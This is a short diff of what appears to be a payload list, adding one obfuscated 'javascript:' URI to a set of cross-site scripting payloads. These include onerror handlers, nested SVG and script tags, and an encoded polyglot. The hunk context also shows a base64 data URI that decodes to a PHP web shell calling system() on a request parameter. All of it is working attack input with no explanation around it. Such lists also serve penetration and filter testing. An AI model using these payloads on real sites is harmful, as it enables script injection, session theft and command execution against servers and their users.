@@ -23,6 +23,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9
 /(A(%22onerror='confirm%601%60'testabcd))/
 <svg<script> onmou<script>seover</script>="confirm('xss')">hii</svg</script>>
 "/><img src=xss onerror=confirm(1)><IMG SRC=/ onerror="confirm(String.fromCharCode(88,83,83))"></img>
+javas&#99;ript:alert(1)
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 `/alert?.(1)'"><Svg/OnLoad='`
 1"<!--><Html%2FOnPointerEnter=%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396K%26%2396<!--
